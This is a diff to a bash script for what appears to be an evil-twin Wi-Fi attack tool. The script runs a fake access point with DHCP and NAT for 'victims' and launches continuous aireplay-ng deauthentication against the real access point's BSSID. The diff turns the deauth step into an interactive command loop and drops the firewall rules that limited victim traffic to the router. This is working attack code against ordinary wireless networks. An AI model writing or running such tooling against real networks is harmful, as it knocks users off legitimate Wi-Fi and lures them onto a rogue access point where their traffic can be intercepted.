@@ -744,10 +744,10 @@ main() {
 
                     iptables -P FORWARD ACCEPT
                     echo "1" > /proc/sys/net/ipv4/ip_forward
-                    iptables -A INPUT -p icmp --icmp-type 8 -s ${AP_SUBNET}/${AP_MASK} -d ${AP_ROUTER}/32 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
-                    iptables -A INPUT -s ${AP_SUBNET}/${AP_MASK} -d ${AP_ROUTER}/32 -j DROP
 
                     if [ -n "${lan}" ]; then
+                        iptables -A FORWARD -i at0 -o "${lan}" -j ACCEPT
+                        iptables -A FORWARD -i "${lan}" -o at0 -m state --state ESTABLISHED,RELATED -j ACCEPT
                         iptables -t nat -A POSTROUTING -o "${lan}" -j MASQUERADE
                     else
                         echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} No internet interface selected. Victims will have no internet access.${WHITE}"
@@ -757,14 +757,6 @@ main() {
                     run_background "dhcpd -d -cf \"${TMP_DIR}/${DHCPD_FILE}\" at0 2>&1 | tee -a ${TMP_DIR}/clts.txt" "dhcpd"
 
                     echo ""
-                    echo -e -n "${WHITE}[${CYAN}?${WHITE}]${GREEN} Deauth clients from real AP? ${WHITE}[${GREEN}1${WHITE}] Yes ${WHITE}[${RED}2${WHITE}] No: "
-                    read deauth_choice
-                    if [ "${deauth_choice}" == "1" ]; then
-                        echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Deauthing clients from ${BOLD_YELLOW}${selected_essid}${WHITE}..."
-                        iwconfig ${wlan} channel ${selected_channel} 2>/dev/null
-                        run_background "aireplay-ng -0 0 -a ${selected_bssid} ${wlan} --ignore-negative-one" "aireplay-ng"
-                    fi
-                    echo ""
                     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Attack running! Fake AP: ${BOLD_YELLOW}${selected_essid}${GREEN} on ${BOLD_PURPLE}at0${WHITE}"
                     if [ -n "${lan}" ]; then
                         echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Internet access: ${BOLD_YELLOW}Enabled${WHITE}"
@@ -773,8 +765,28 @@ main() {
                     fi
                     echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Check logs: ${BOLD_CYAN}./tmp/{airbase-ng,dhcpd,aireplay-ng}.log${WHITE}"
                     echo ""
-                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Press ${BOLD_YELLOW}Enter${GREEN} to stop the attack and clean up.${WHITE}"
-                    read
+                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Commands: ${BOLD_YELLOW}[d]${GREEN}eauth ${WHITE}| ${BOLD_YELLOW}[q]${GREEN}uit${WHITE}"
+                    deauth_running=false
+                    while true; do
+                        echo -e -n "${YELLOW}>>${WHITE} "
+                        read -n 1 cmd
+                        echo ""
+                        case "${cmd}" in
+                            d|D)
+                                if [ "${deauth_running}" == false ]; then
+                                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Deauthing clients from ${BOLD_YELLOW}${selected_essid}${WHITE}..."
+                                    iwconfig ${wlan} channel ${selected_channel} 2>/dev/null
+                                    run_background "aireplay-ng -0 0 -a ${selected_bssid} ${wlan} --ignore-negative-one" "aireplay-ng"
+                                    deauth_running=true
+                                else
+                                    echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Deauth already running.${WHITE}"
+                                fi
+                                ;;
+                            q|Q)
+                                break
+                                ;;
+                        esac
+                    done
                     ;;
                 "2")
                     echo ""
